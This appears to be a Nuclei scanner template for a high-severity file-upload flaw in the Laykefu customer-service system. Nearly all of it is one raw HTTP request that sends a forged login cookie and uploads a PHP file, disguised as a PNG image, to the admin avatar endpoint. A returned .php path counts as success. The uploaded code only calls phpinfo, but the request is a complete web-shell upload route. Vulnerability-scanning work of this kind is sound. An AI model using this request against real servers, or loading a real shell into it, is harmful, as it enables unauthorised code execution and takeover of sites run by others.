
id: Laykefu-Upload

info:
  name: Laykefu-Upload
  author: lanyue
  severity: high
  description: Laykefu-Upload-GetShell
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true

http:
  - raw:
      - |
        POST /admin/users/upavatar.html HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26
        Accept-Encoding: gzip, deflate, br
        Accept: application/json, text/javascript, */*; q=0.01
        Connection: close
        X-Requested-With: XMLHttpRequest
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: user_name=1; user_id=3
        Content-Length: 208
        Content-Type: multipart/form-data; boundary=11c97b627bbbbaaddf33671457bfb1ff

        --11c97b627bbbbaaddf33671457bfb1ff
        Content-Disposition: form-data; name="file"; filename="zxc.php"
        Content-Type: image/png

        <?php phpinfo();?>
        --11c97b627bbbbaaddf33671457bfb1ff--

    max-redirects: 3
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - .{30,}.php
      - type: status
        part: header
        words:
          - 200